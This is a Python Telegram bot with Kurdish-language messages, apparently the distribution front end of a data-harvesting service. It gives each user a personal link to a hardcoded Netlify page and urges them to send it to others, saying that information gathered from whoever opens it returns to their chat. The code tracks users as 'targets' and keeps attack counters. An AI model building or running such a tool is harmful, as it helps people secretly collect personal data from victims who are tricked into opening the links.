import os
import sys
import time
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# خوێندنەوەی تووکنەکان و ئایدییەکان لە ژینگەی سێرڤەرەوە (Secrets)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = os.environ.get("OWNER_ID")
ADMIN_IDS = os.environ.get("ADMIN_IDS", "").split(",")

if not BOT_TOKEN:
    print("[!] ERROR: BOT_TOKEN is not set in the environment variables!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN, threaded=True)

# پاککردنەوەی لیستەکە لە سپەیس
ADMIN_IDS = [int(admin_id.strip()) for admin_id in ADMIN_IDS if admin_id.strip().isdigit()]
if OWNER_ID and OWNER_ID.isdigit():
    OWNER_ID = int(OWNER_ID)
else:
    OWNER_ID = None

attack_active = threading.Event()
bot_offline = threading.Event()
attack_stats = {"sent": 0, "success": 0, "target": ""}
connected_targets = set()

# لینکی نێتلیفایەکەت
ULTIMATE_NETLIFY_LINK = "https://stalwart-strudel-728ffd.netlify.app/"

def is_authorized(user_id):
    if OWNER_ID and user_id == OWNER_ID:
        return True
    if user_id in ADMIN_IDS:
        return True
    return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if bot_offline.is_set() and not is_authorized(message.from_user.id):
        bot.reply_to(message, "⚠️ **[SYSTEM OFFLINE]**\n\nبۆت لەلایەن خاوەنەوە ڕاگیراوە.")
        return

    user = message.from_user
    user_name = user.first_name
    user_id = user.id
    
    connected_targets.add((user_id, user_name))
    
    welcome_text = (
        f"💀 **بەخێر بێیت بۆ ژووری ئۆپەراسیۆنەکان، {user_name}!** 💀\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ **سیستەمی کۆکردنەوەی زانیاری و لینکی تایبەت:**\n"
        "• دۆخی سێرڤەر: `ONLINE & SECURE`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 بۆ وەرگرتنی لینکی چاودێریی تایبەتی خۆت کلیک لەسەر دوگمەی خوارەوە بکە:"
    )
    
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🔗 وەرگرتنی لینکی چاودێریی تایبەت", callback_data="get_ultimate_link"),
        InlineKeyboardButton("🛡️ دەربارەی سیستەم", callback_data="about")
    )
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if bot_offline.is_set() and not is_authorized(call.from_user.id):
        bot.answer_callback_query(call.id, "⚠️ بۆت ڕاگیراوە!", show_alert=True)
        return

    if call.data == "get_ultimate_link":
        user_id = call.from_user.id
        # دروستکردنی لینک کە ئایدیی خودی بەکارهێنەری تێدایە (?to=USER_ID)
        link = f"{ULTIMATE_NETLIFY_LINK}?to={user_id}"
        
        bot.answer_callback_query(call.id, "لینکی تایبەتی تۆ ئامادە کرا!")
        
        response_text = (
            "🔗 **لینکی چاودێریی تایبەتی تۆ:**\n\n"
            f"`{link}`\n\n"
            "👇 **ئەم لینکە بنێرە بۆ هەر کەسێک؛ هەر زانیارییەکی نوێ بێت ڕاستەوخۆ دەگەڕێتەوە بۆ چاتی *خودی تۆ*!**"
        )
        bot.send_message(call.message.chat.id, response_text, parse_mode="Markdown")

    elif call.data == "about":
        bot.answer_callback_query(call.id, "دەربارەی سیستەم")
        bot.send_message(call.message.chat.id, "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\nسیستەمی ئۆتۆماتیکی بۆ کۆکردنەوەی زانیاری.", parse_mode="Markdown")

@bot.message_handler(commands=['shutdown', 'off'])
def shutdown_bot(message):
    if not is_authorized(message.from_user.id):
        return
    bot_offline.set()
    bot.reply_to(message, "🔌 بۆت لەلایەن خاوەنەوە ڕاگیرا.")

@bot.message_handler(commands=['poweron', 'on'])
def poweron_bot(message):
    if not is_authorized(message.from_user.id):
        return
    bot_offline.clear()
    bot.reply_to(message, "🟢 بۆت سەرلەنوێ هەڵبووەوە!")

if __name__ == '__main__':
    print("==========================================")
    print("💀 TITANIUM OMEGA: STABLE RUNNER ACTIVE 💀")
    print("==========================================")
    try:
        bot.remove_webhook()
    except:
        pass
    bot.infinity_polling(skip_pending=True)
